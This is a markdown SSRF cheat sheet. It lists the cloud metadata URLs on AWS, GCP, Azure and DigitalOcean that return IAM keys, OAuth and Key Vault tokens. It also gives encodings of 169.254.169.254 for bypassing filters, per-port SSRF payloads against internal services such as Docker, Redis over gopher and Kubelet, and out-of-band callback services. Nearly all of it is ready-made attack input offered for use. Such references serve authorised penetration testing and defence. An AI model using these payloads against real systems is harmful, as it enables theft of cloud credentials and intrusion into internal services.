# Cloud Metadata Endpoints

## AWS

| Path | What it returns |
|---|---|
| `http://169.254.169.254/latest/meta-data/` | Root metadata listing |
| `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | IAM role name |
| `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE` | AccessKeyId, SecretAccessKey, Token |
| `http://169.254.169.254/latest/meta-data/hostname` | Instance hostname |
| `http://169.254.169.254/latest/meta-data/public-keys/` | SSH key names |
| `http://169.254.169.254/latest/user-data` | User-data script (often has secrets) |
| `http://169.254.169.254/latest/meta-data/network/interfaces/macs/` | MAC addresses |
| `http://169.254.169.254/latest/api/token` | IMDSv2 token endpoint (POST, needs TTL header) |

## GCP

| Path | Headers required | What it returns |
|---|---|---|
| `http://metadata.google.internal/computeMetadata/v1/` | `Metadata-Flavor: Google` | Root listing |
| `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` | `Metadata-Flavor: Google` | OAuth access token |
| `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email` | `Metadata-Flavor: Google` | Service account email |
| `http://metadata.google.internal/computeMetadata/v1/project/project-id` | `Metadata-Flavor: Google` | GCP project ID |
| `http://metadata.google.internal/computeMetadata/v1/instance/attributes/` | `Metadata-Flavor: Google` | Custom metadata (often has secrets) |
| `http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys` | `Metadata-Flavor: Google` | Project SSH keys |

## Azure

| Path | Headers required | What it returns |
|---|---|---|
| `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | `Metadata: true` | Full instance metadata |
| `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` | `Metadata: true` | Managed identity token |
| `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/` | `Metadata: true` | Key Vault token |

## DigitalOcean

| Path | What it returns |
|---|---|
| `http://169.254.169.254/metadata/v1/` | Root metadata |
| `http://169.254.169.254/metadata/v1/id` | Droplet ID |
| `http://169.254.169.254/metadata/v1/user-data` | User-data (often has secrets) |

---

## IP Encoding Bypasses for 169.254.169.254

| Technique | Encoded |
|---|---|
| Decimal | `2852039166` |
| Hex | `0xa9fea9fe` |
| Octal | `0251.0376.0251.0376` |
| IPv6 mapped | `[::ffff:169.254.169.254]` |
| Mixed encoding | `169.254.0xa9.0xfe` |
| DNS resolving to IP | `169.254.169.254.nip.io` |

---

## Common Internal Service Ports

| Port | Service | SSRF Payload |
|---|---|---|
| 22 | SSH | `http://127.0.0.1:22/` — banner leaks version |
| 80/8080 | HTTP | `http://127.0.0.1:80/` |
| 443/8443 | HTTPS | `http://127.0.0.1:443/` |
| 2375 | Docker (unauth) | `http://127.0.0.1:2375/v1.24/containers/json` |
| 3306 | MySQL | `http://127.0.0.1:3306/` |
| 5432 | PostgreSQL | `http://127.0.0.1:5432/` |
| 6379 | Redis | `gopher://127.0.0.1:6379/_INFO` |
| 8500 | Consul | `http://127.0.0.1:8500/v1/agent/self` |
| 9200 | Elasticsearch | `http://127.0.0.1:9200/_cat/indices` |
| 10250 | Kubelet (read) | `http://127.0.0.1:10250/pods` |
| 27017 | MongoDB | `http://127.0.0.1:27017/` |

---

## OOB Callback Platforms

| Tool | URL |
|---|---|
| Burp Collaborator | `https://YOUR-ID.oastify.com` |
| interactsh | `https://app.interactsh.com` — `YOUR-ID.oast.fun` |
| canarytokens | `https://canarytokens.org` |
| webhook.site | `https://webhook.site` |
